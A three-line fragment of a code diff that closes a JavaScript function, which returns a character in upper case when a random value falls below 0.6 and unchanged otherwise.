+  if (r < 0.6) return ch.toUpperCase();
+  return ch;
+}
